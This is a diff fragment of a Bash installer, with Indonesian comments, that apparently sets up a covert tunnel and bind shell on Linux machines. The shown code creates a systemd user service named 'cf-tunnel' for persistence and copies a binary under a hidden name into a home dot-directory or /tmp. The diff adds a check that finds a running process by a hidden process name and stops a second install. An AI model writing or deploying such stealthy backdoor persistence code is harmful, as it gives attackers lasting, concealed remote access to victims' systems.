@@ -170,7 +170,7 @@ EOF
 install_persistence() {
     local script_path="$1"
     local service_name="cf-tunnel"
-    # Cek apakah systemd user tersedia
+    # Cek apakah systemd user tersedia (dengan silent)
     if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
         mkdir -p "${HOME}/.config/systemd/user"
         cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
@@ -197,6 +197,20 @@ EOF
         return 0
     else
         return 1
+    fi
+}
+
+# ========== DETEKSI INSTALASI SUDAH ADA ==========
+check_existing_installation() {
+    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
+    if [[ -f "$token_file" ]]; then
+        warn "Installation already detected. If you want to reinstall, first uninstall with the token."
+        exit 1
+    fi
+    # Cek apakah proses bindshell atau tunnel sudah berjalan
+    if pgrep -f "$PROC_HIDDEN_NAME" >/dev/null 2>&1; then
+        warn "Process with name '$PROC_HIDDEN_NAME' already running. This may be an existing installation."
+        exit 1
     fi
 }
 
@@ -244,6 +258,9 @@ uninstall() {
 # Cek uninstall dengan token
 [[ -n "${CF_UNINSTALL:-}" ]] && uninstall
 
+# Cek apakah instalasi sudah ada (hanya jika tidak dalam mode uninstall)
+check_existing_installation
+
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
 
@@ -260,13 +277,11 @@ finish_ok
 
 # --- Step 3: Copying binaries dengan fallback ---
 print_step "Copying binaries..."
-# Coba buat direktori di home
 INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
 USE_TMP=0
 if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
     USE_TMP=1
 elif ! cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null; then
-    # mkdir sukses tapi cp gagal, gunakan /tmp
     USE_TMP=1
 fi
 
